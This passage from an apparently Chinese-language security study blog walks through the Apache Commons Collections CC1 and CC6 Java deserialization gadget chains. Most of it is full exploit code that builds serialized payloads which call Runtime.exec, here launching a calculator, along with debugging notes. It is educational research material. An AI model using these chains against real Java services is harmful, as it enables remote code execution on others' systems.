class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;  <br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;  <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class), <span class="hljs-comment">// 构造 setValue 的可控参数  </span><br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>  <br> , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)  <br>        &#125;;  <br> <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);  <br> HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  <br> <span class="hljs-type">Map</span> <span class="hljs-variable">decorateMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);  <br>  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);  <br> <span class="hljs-type">Constructor</span> <span class="hljs-variable">declaredConstructor</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);  <br> declaredConstructor.setAccessible(<span class="hljs-literal">true</span>);  <br> <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">invocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) declaredConstructor.newInstance(Override.class, decorateMap);  <br>  <br> <span class="hljs-type">Map</span> <span class="hljs-variable">proxyMap</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader()  <br>                , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, invocationHandler);  <br> invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Override.class, proxyMap);  <br>  <br> serialize(invocationHandler);  <br> unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);  <br> &#125;  <br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;  <br>            <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));  <br> oos.writeObject(obj);  <br> &#125;  <br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;  <br>            <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));  <br> <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();  <br> <span class="hljs-keyword">return</span> obj;  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>最后注意invoke方法的这里，必须要调用一个无参方法才会走到下面的get，否则在中途直接return了(这里我们用的是<code>memberValues.entrySet()</code>)。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (member.equals(<span class="hljs-string">&quot;equals&quot;</span>) &amp;&amp; paramTypes.length == <span class="hljs-number">1</span> &amp;&amp;<br>            paramTypes[<span class="hljs-number">0</span>] == Object.class)<br>            <span class="hljs-keyword">return</span> equalsImpl(args[<span class="hljs-number">0</span>]);<br>        <span class="hljs-keyword">if</span> (paramTypes.length != <span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java">Gadget chain:<br>    ObjectInputStream.readObject()<br>        AnnotationInvocationHandler.readObject()<br>            Map(Proxy).entrySet()<br>                AnnotationInvocationHandler.invoke()<br>                    LazyMap.get()<br>                        ChainedTransformer.transform()<br>                            ConstantTransformer.transform()<br>                            InvokerTransformer.transform()<br>                                Method.invoke()<br>                                    Class.getMethod()<br>                            InvokerTransformer.transform()<br>                                Method.invoke()<br>                                    Runtime.getRuntime()<br>                            InvokerTransformer.transform()<br>                                Method.invoke()<br>                                    Runtime.exec()<br></code></pre></td></tr></table></figure><h2 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h2><p>链子尾部与CC1相同：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">LazyMap.get() -&gt;  factory.transform() -&gt; InvokeTransfromer.transfrom()<br></code></pre></td></tr></table></figure><p>那么谁调用了这个get？</p><p><code>TiedMapEntry</code> 类中的 <code>getValue()</code> 方法调用了 <code>LazyMap</code> 的 <code>get()</code> 方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//TiedMapEntry.java</span><br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getValue</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> map.get(key);<br>    &#125;<br></code></pre></td></tr></table></figure><p>利用<code>TiedMaEntry</code>中的<code>getvalue()</code>方法调个计算器：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TiedMapEntryEXP</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;  <br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;  <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;) <br>        &#125;;  <br> <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);  <br> HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  <br> <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);  <br> <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;key&quot;</span>);  <br> tiedMapEntry.getValue();<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里说白了还是去调<code>LazyMap.get(&quot;叉叉叉&quot;)</code>，利用下面这东西：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"> <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;key&quot;</span>);  <br> tiedMapEntry.getValue();<br><span class="hljs-comment">//getValue方法：</span><br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getValue</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> map.get(key);<br>    &#125;<br><span class="hljs-comment">//这里map是构造函数里的Lazymap，而且这东西是个public修饰的，直接实例化一个对象调用就行</span><br></code></pre></td></tr></table></figure><p>再往上找谁调用了这个<code>getValue()</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//TiedMapEntry.java</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> getValue();<br>        <span class="hljs-keyword">return</span> (getKey() == <span class="hljs-literal">null</span> ? <span class="hljs-number">0</span> : getKey().hashCode()) ^<br>               (value == <span class="hljs-literal">null</span> ? <span class="hljs-number">0</span> : value.hashCode()); <br>    &#125;<br></code></pre></td></tr></table></figure><p>谁调用了<code>hashcode()</code>这个方法？</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gcode">xxx.readObject<span class="hljs-comment">()</span><br>HashMap.put<span class="hljs-comment">()</span> --自动调用--&gt;   HashMap.hash<span class="hljs-comment">()</span><br>后续利用链.hashCode<span class="hljs-comment">()</span><br></code></pre></td></tr></table></figure><p>从 <code>HashMap.put</code> 开始，到 <code>InvokerTransformer</code> 结尾的弹计算器的 EXP</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs JAVA"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;  <br>  <br><span class="hljs-keyword">import</span> java.lang.reflect.Field;  <br><span class="hljs-keyword">import</span> java.util.HashMap;  <br><span class="hljs-keyword">import</span> java.util.Map;  <br>  <br><span class="hljs-comment">// 用 HashMap 的 hash 方法完成链子  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HashMapEXP</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;  <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)  <br>        &#125;;  <br> <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);  <br> HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  <br> <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);  <br> <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;key&quot;</span>);  <br> HashMap&lt;Object, Object&gt; expMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  <br> expMap.put(tiedMapEntry, <span class="hljs-string">&quot;value&quot;</span>);  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><code>HashMap</code> 类的 <code>put()</code> 方法自动调用了 <code>hash</code> 方法，进而调用<code>hashicode</code>方法:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-keyword">public</span> V <span class="hljs-title function_">put</span><span class="hljs-params">(K key, V value)</span> &#123;<br>        <span class="hljs-keyword">return</span> putVal(hash(key), key, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">true</span>);<br>    &#125;<br><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hash</span><span class="hljs-params">(Object key)</span> &#123;<br>        <span class="hljs-type">int</span> h;<br>        <span class="hljs-keyword">return</span> (key == <span class="hljs-literal">null</span>) ? <span class="hljs-number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="hljs-number">16</span>);<br>    &#125;<br><span class="hljs-comment">//TiedMapEntry下的hashcode方法</span><br><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> getValue();<br>    <span class="hljs-keyword">return</span> (getKey() == <span class="hljs-literal">null</span> ? <span class="hljs-number">0</span> : getKey().hashCode()) ^<br>        (value == <span class="hljs-literal">null</span> ? <span class="hljs-number">0</span> : value.hashCode()); <br>&#125;<br></code></pre></td></tr></table></figure><p>这里有个小问题：在EXP这里打断点：</p><p><img src="/img/CC601.png" alt="CC601"></p><p><code>Debug</code>的时候就能直接弹计算器了</p><p>这里甚至都没有进行put操作，因为：</p><p>因为在 IDEA 进行 debug 调试的时候，为了展示对象的集合，会自动调用 <code>toString()</code> 方法，所以在创建 <code>TiedMapEntry</code> 的时候，就自动调用了 <code>getValue()</code> 最终将链子走完，然后弹出计算器。</p><p><a href="https://drun1baby.top/2022/06/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8703-CC6%E9%93%BE/">参考文章</a></p><p>目前写出的CC6链子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-comment">// 用 HashMap 的 hash 方法完成链子  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC603</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;key&quot;</span>);<br>        HashMap&lt;Object, Object&gt; expMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        expMap.put(tiedMapEntry, <span class="hljs-string">&quot;value&quot;</span>);<br><br>        serialize(expMap);<br>        <span class="hljs-comment">//unserialize(&quot;ser.bin&quot;);</span><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这时运行序列化就会直接弹出计算器：</p><p>其实就是hashmap里那个put方法的锅：可以看到在put的时候就已经触发hash方法了，而不是等到readobject的时候触发hash方法</p><p>其实这里和URLDNS那条链子一样：我们希望是由<code>readObject</code>方法触发<code>hash</code>然后触发<code>hashcode</code>，但前面也说了：<code>put</code>的时候也会走到<code>hash</code>那边：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//Hashmap</span><br>    <span class="hljs-keyword">public</span> V <span class="hljs-title function_">put</span><span class="hljs-params">(K key, V value)</span> &#123;<br>        <span class="hljs-keyword">return</span> putVal(hash(key), key, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">true</span>);<br>    &#125;<br></code></pre></td></tr></table></figure><p>修改的目的？让put方法的时候无法触发这条链子，比如我在put前先把这条链子里某些东西改成错误的，put完之后修改成正确的，让它等到反序列化的readobject时再触发：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);<br><br><br>-----------------&gt; 变成<br><br><span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-string">&quot;five&quot;</span>));<br><br><br><span class="hljs-comment">//在执行 put 方法之后通过反射修改 Transformer 的 factory 值</span><br><br><br>Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;  <br><span class="hljs-type">Field</span> <span class="hljs-variable">factoryField</span> <span class="hljs-operator">=</span> lazyMapClass.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);  <br>factoryField.setAccessible(<span class="hljs-literal">true</span>);  <br>factoryField.set(lazyMapClass, chainedTransformer);<br></code></pre></td></tr></table></figure><p>但这时发现反序列化还是没法触发计算器，问题出在Lazymap的get方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">get</span><span class="hljs-params">(Object key)</span> &#123;<br>    <span class="hljs-comment">// create value for key if key is not currently in the map</span><br>    <span class="hljs-keyword">if</span> (map.containsKey(key) == <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> factory.transform(key);<br>        map.put(key, value);<br>        <span class="hljs-keyword">return</span> value;<br>    &#125;<br>    <span class="hljs-keyword">return</span> map.get(key);<br>&#125;<br></code></pre></td></tr></table></figure><p>注意他这个东西会在map中不包含key的时候才会触发后面那个factory.transform(key)，然后他会把这个key放进去！！那么我们在反序列化的时候这里就已经有这个key了，也就不会触发factory.transform(key)这个方法。</p><p>解决方法也很简单，put完再把key删了就行：</p><p>Finalexp:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 